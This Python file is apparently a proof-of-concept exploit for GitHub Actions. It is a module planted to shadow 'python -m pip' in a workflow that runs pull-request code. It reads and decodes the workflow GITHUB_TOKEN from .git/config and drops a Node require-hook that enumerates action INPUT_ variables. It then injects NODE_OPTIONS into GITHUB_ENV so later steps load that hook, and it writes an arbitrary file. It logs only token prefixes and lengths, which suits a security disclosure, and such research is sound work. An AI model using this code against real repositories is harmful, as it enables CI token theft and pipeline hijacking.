"""Attacker-controlled module that shadows ``pip`` for ``python -m pip``."""
import os, re, base64, sys

marker = "PIP_SHADOW_RCE"
cwdp = os.getcwd()
print(f"{marker}: cwd={cwdp}")

# The checkout step persists the workflow GITHUB_TOKEN in .git/config.
tok = None
try:
    with open(os.path.join(cwdp, ".git", "config"), encoding="utf-8", errors="ignore") as fh:
        cfg = fh.read()
    m = re.search(r"AUTHORIZATION:\s*basic\s+([A-Za-z0-9+/=]+)", cfg)
    if m:
        tok = base64.b64decode(m.group(1)).decode("utf-8", "ignore").split(":", 1)[-1].strip()
except Exception as exc:
    print(f"{marker}: token read error {exc!r}")
print(f"{marker}: git_token_prefix={(tok or '')[:4]!r} len={len(tok or '')}")

# Drop a require-hook that later Node actions will load.
hook = os.path.join(cwdp, "gab_steal.js")
with open(hook, "w", encoding="utf-8") as fh:
    fh.write("""
const keys = Object.keys(process.env).filter(k => k.startsWith('INPUT_'));
const out = keys.map(k => `${k}=len:${(process.env[k]||'').length}`).join(';');
console.log('NODE_HOOK_RAN inputs=' + out);
""")

env_path = os.environ.get("GITHUB_ENV")
if env_path:
    with open(env_path, "a", encoding="utf-8") as fh:
        fh.write(f"NODE_OPTIONS=--require {hook}\n")
        fh.write("PWNED_BY_PIP_SHADOW=yes\n")
    print(f"{marker}: NODE_OPTIONS injected")

with open(os.path.join(cwdp, "pwned.txt"), "w", encoding="utf-8") as fh:
    fh.write("arbitrary file write from PR head\n")

sys.exit(0)
